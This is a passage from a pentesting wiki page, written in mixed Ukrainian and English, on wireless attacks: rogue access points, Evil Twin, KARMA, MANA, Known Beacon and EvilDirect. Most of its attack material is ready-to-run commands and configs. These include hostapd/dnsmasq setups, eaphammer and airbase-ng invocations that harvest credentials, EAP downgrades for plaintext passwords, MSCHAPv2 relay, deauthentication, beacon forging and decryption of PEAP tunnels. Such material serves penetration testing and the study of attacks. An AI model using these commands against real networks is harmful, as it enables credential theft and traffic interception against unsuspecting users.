- Знання PNL пристрою дозволяє потенційно експлуатувати його, наслідуючи відому мережу за ESSID і введучи пристрій в оману для підключення до шкідливого AP.

### Active Probing

- Active probing передбачає відправлення станціями probe requests для виявлення сусідніх AP і їх характеристик.
- Directed probe requests націлені на конкретний ESSID, допомагаючи визначити, чи певна мережа перебуває в зоні досяжності, навіть якщо вона прихована.
- Broadcast probe requests мають null SSID поле і відсилаються всім сусіднім AP, дозволяючи станції перевірити наявність будь-якої preferred мережі без розкриття вмісту її PNL.

## Simple AP with redirection to Internet

Before explaining how to perform more complex attacks it's going to be explained **how** to just **create** an **AP** and **redirect** it's **traffic** to an interface connected **to** the **Internet**.

Using `ifconfig -a` check that the wlan interface to create the AP and the interface connected to the Internet are present.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Створіть файл конфігурації `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Потім **налаштуйте IP-адреси** та **маршрути**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
А потім **запустіть** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Створіть конфігураційний файл `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Зупиніть зайві процеси**, увімкніть **monitor mode**, та **запустіть hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Переспрямування та перенаправлення
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Атака Evil Twin використовує те, як WiFi-клієнти розпізнають мережі, покладаючись насамперед на ім'я мережі (ESSID) і не вимагаючи, щоб базова станція (access point) автентифікувалася перед клієнтом. Ключові моменти:

- **Складність розрізнення**: Пристрої важко відрізнити легітимні та rogue access point, коли вони мають однаковий ESSID та тип шифрування. У реальних мережах часто використовують кілька access point з однаковим ESSID для безшовного розширення покриття.
- **Роумінг клієнта та маніпуляція підключенням**: Протокол 802.11 дозволяє пристроям переміщатися між access point в рамках того самого ESS. Зловмисники можуть експлуатувати це, заманюючи пристрій відключитися від поточної базової станції та підключитися до rogue access point. Це можна досягти, запропонувавши сильніший сигнал або порушивши з'єднання з легітимним access point за допомогою, наприклад, deauthentication packets або jamming.
- **Складнощі виконання**: Успішне виконання evil twin attack у середовищах з кількома добре розташованими access point може бути складним. Deauthenticating одного легітимного access point часто призводить до того, що пристрій підключається до іншого легітимного access point, якщо зловмисник не може deauthenticate всі навколишні access point або стратегічно розмістити rogue access point.

Ви можете створити дуже простий Open Evil Twin (без можливості маршрутизувати трафік в Internet), зробивши:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Ви також можете створити Evil Twin, використовуючи **eaphammer** (зверніть увагу, що для створення evil twins за допомогою eaphammer interface **не повинен бути** у **monitor** режимі):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Або використовуючи Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Зверніть увагу, що за замовчуванням, якщо ESSID у PNL збережено як WPA-захищений, пристрій не підключиться автоматично до Open Evil Twin. Ви можете спробувати DoS справжній AP і сподіватися, що користувач вручну підключиться до вашого Open Evil Twin, або ви можете DoS справжній AP і використати WPA Evil Twin, щоб перехопити handshake (за допомогою цього методу ви не зможете дозволити жертві підключитися до вас, оскільки ви не знаєте PSK, але ви зможете перехопити handshake і спробувати його зламати).

_Деякі OS і AV попереджуватимуть користувача, що підключення до Open мережі небезпечне..._

### WPA/WPA2 Evil Twin

Ви можете створити **Evil Twin using WPA/2** і якщо пристрої налаштовані підключатися до цього SSID з WPA/2, вони спробують підключитися. У будь-якому разі, **to complete the 4-way-handshake** вам також потрібно **знати** **пароль**, який клієнт збирається використовувати. Якщо ви **не знаєте** його, **з'єднання не буде завершено**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Щоб зрозуміти ці атаки, рекомендую перед цим прочитати коротке [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Використання hostapd-wpe**

`hostapd-wpe` для роботи потребує файлу **конфігурації**. Щоб **автоматизувати** генерацію цих конфігурацій, ви можете використати [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (завантажте python-файл у папку _/etc/hostapd-wpe_/)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
У конфігураційному файлі ви можете вибрати багато різних речей, таких як ssid, channel, user files, cret/key, dh parameters, wpa version and auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Використання EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
За замовчуванням EAPHammer застосовує такі методи автентифікації (зауважте GTC першим — щоб спробувати отримати plaintext passwords — після чого використовуються більш надійні auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Це методологія за замовчуванням, щоб уникнути довгого часу підключення. Однак ви також можете вказати серверу методи автентифікації від найслабших до найсильніших:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` щоб використати високоефективну реалізацію GTC downgrade (паролі у відкритому тексті)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` щоб вручну вказати запропоновані методи (якщо запропонувати ті самі auth methods у тому самому порядку, що й у організації, атаку буде набагато складніше виявити).
- [Детальніше в wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- Якщо пристрої налаштовані на "do not validate certificate", клонований AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) збирає **NetNTLMv2** (PEAP-MSCHAPv2) або **cleartext** облікові дані (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) одночасно виявляє приховані SSID під час probe-запитів і примушує перепідключення, якщо тільки PMF/802.11w не блокує підроблені deauth.
- Зламаний NetNTLMv2 дає багаторазово використовувані Wi‑Fi/AD облікові дані; GTC дає негайні облікові дані у відкритому вигляді.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- Для облікових записів машин з незламними випадковими паролями зловживайте **MSCHAPv2 relay**: запустіть `hostapd-mana` як Evil Twin, пересилаючи MSCHAPv2 обмін до `wpa_sycophant`, який одночасно підключається до легітимного AP. Успішний relay надає автентифікований доступ до Wi‑Fi без відновлення пароля.
- Використовуйте збірки, що підтримують цільовий рівень безпеки (WPA3/PMF вимагає сучасних hostapd/wpa_supplicant); PMF перешкоджає примусовому deauth, тому чекайте на добровільні асоціації клієнтів.

**Using Airgeddon**

`Airgeddon` може використовувати попередньо згенеровані сертифікати, щоб запропонувати EAP authentication для мереж WPA/WPA2-Enterprise. Фейкова мережа знизить протокол підключення до EAP-MD5, тож вона зможе **capture the user and the MD5 of the password**. Пізніше нападник може спробувати зламати пароль.\
`Airggedon` дає можливість виконувати **continuous Evil Twin attack (noisy)** або **лише створити Evil Attack до підключення кого-небудь (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_Цей метод протестовано на з'єднанні PEAP, але оскільки я дешифрую довільний TLS тунель, це має також працювати з EAP-TTLS_

У **конфігурації** _hostapd-wpe_ **закоментуйте** рядок, що містить _**dh_file**_ (з `dh_file=/etc/hostapd-wpe/certs/dh` на `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Це змусить `hostapd-wpe` **обмінювати ключі з використанням RSA** замість DH, тож ви зможете пізніше **дешифрувати** трафік, **знаючи приватний ключ сервера**.

Тепер запустіть **Evil Twin** використовуючи **`hostapd-wpe`** з тією зміненою конфігурацією як зазвичай. Також запустіть **`wireshark`** на **інтерфейсі**, який виконує атаку Evil Twin.

Тепер або пізніше (коли ви вже захопили кілька спроб автентифікації) ви можете додати приватний RSA ключ у wireshark за адресою: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Додайте новий запис і заповніть форму цими значеннями: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, щоб уникнути проблем виберіть файл ключа **без захисту паролем**).

![](<../../images/image (687).png>)

І перегляньте нову вкладку **"Decrypted TLS"**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA та Known beacons attack

### ESSID and MAC black/whitelists

Різні типи Media Access Control Filter Lists (MFACLs) та їх відповідні режими й вплив на поведінку rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Rogue AP буде відповідати лише на probe requests від пристроїв, вказаних у whitelist, залишаючись невидимим для всіх інших, які не наведені у списку.
2. **MAC-based Blacklist**:
- Rogue AP ігнорує probe requests від пристроїв у blacklist, ефективно роблячи rogue AP невидимим для цих конкретних пристроїв.
3. **SSID-based Whitelist**:
- Rogue AP відповідатиме на probe requests лише для певних ESSID, зазначених у списку, роблячи його невидимим для пристроїв, чиї Preferred Network Lists (PNLs) не містять цих ESSID.
4. **SSID-based Blacklist**:
- Rogue AP не відповідатиме на probe requests для конкретних ESSID у blacklist, роблячи його невидимим для пристроїв, які шукають саме ті мережі.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Цей метод дозволяє зловмиснику створити шкідливу точку доступу (AP), яка відповідає на всі probe requests від пристроїв, що намагаються підключитися до мереж. Ця техніка обманює пристрої, змушуючи їх підключатися до AP зловмисника, імітуючи мережі, які шукає пристрій. Коли пристрій надсилає запит на підключення до такої підробленої точки доступу, підключення завершується, і пристрій помилково підключається до мережі зловмисника.

### MANA

Згодом пристрої почали ігнорувати ненадійні відповіді мереж, що знизило ефективність оригінальної KARMA attack. Проте Ian de Villiers та Dominic White представили новий метод, відомий як MANA attack. Цей метод полягає в тому, що підроблена AP захоплює Preferred Network Lists (PNL) пристроїв, відповідаючи на їхні broadcast probe requests назвами мереж (SSIDs), які раніше збережені пристроями. Ця витончена атака обходить захисти проти початкової KARMA attack, експлуатуючи спосіб, у який пристрої запам'ятовують і надають пріоритет відомим мережам.

MANA attack працює шляхом моніторингу як directed, так і broadcast probe requests від пристроїв. Для directed запитів вона фіксує MAC address пристрою та запитувану назву мережі, додаючи цю інформацію до списку. Коли надходить broadcast запит, AP відповідає інформацією, що відповідає будь-якій мережі зі списку пристрою, підштовхуючи його підключитися до підробленої точки доступу.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** — це просунута стратегія, що застосовується, коли пристрої не використовують directed probing або коли їх Preferred Network Lists (PNL) невідомі атакуючому. Вона базується на принципі, що **пристрої в одній зоні, ймовірно, мають спільні назви мереж у своїх PNLs**. Замість вибіркової відповіді цей attack транслює probe responses для кожної назви мережі (ESSID), знайденої в об'єднаних PNLs усіх спостережуваних пристроїв. Такий широкий підхід підвищує ймовірність того, що пристрій впізнає знайому мережу і спробує підключитися до rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Коли **Loud MANA attack** може бути недостатньою, **Known Beacon attack** пропонує інший підхід. Цей метод **brute-forces процес підключення, імітуючи AP, який відповідає на будь-яку назву мережі, перебираючи список потенційних ESSIDs**, отриманих із wordlist. Це імітує присутність численних мереж у спробі співпасти з ESSID у PNL жертви, змушуючи пристрій спробувати підключитися до підробленого AP. Атака може бути посилена поєднанням з опцією `--loud` для більш агресивної спроби заманити пристрої.

Eaphammer реалізував цю атаку як MANA attack, де всі ESSIDs у списку поширюються (ви також можете поєднати це з `--loud`, щоб створити Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

The **Known Beacon Burst attack** полягає в **rapid-fire broadcasting of beacon frames for each ESSID listed in a file**. Це створює щільне середовище підроблених мереж, що значно підвищує ймовірність підключення пристроїв до rogue AP, особливо в поєднанні з MANA attack. Ця техніка використовує швидкість і обсяг, щоб перевантажити механізми вибору мереж пристроїв.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** — протокол, який дозволяє пристроям з'єднуватися безпосередньо один з одним через Wi-Fi без потреби в традиційній точці доступу. Ця можливість вбудована в різні Internet of Things (IoT) пристрої, такі як принтери та телевізори, і полегшує пряме пристрій-до-пристрою спілкування. Важливою особливістю Wi-Fi Direct є те, що один пристрій приймає на себе роль точки доступу, відомої як group owner, для керування з'єднанням.

Забезпечення безпеки Wi-Fi Direct здійснюється через **Wi-Fi Protected Setup (WPS)**, який підтримує кілька методів для безпечного спарювання, зокрема:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Ці методи, особливо PIN entry, піддаються тим самим вразливостям, що й WPS у традиційних Wi-Fi мережах, через що вони стають цілями для схожих векторів атак.

### EvilDirect Hijacking

**EvilDirect Hijacking** — атака, специфічна для Wi-Fi Direct. Вона відтворює концепцію Evil Twin attack, але спрямована на Wi-Fi Direct з'єднання. У цьому сценарії зловмисник видає себе за легітимного group owner з метою обманути пристрої, щоб ті підключилися до шкідливого вузла. Цей метод можна реалізувати за допомогою інструментів на кшталт `airbase-ng`, вказавши канал, ESSID та MAC-адресу імітованого пристрою:

## Посилання

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Переглянути [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (логін через Facebook та імітація WPA у captive portals)

{{#include ../../banners/hacktricks-training.md}}
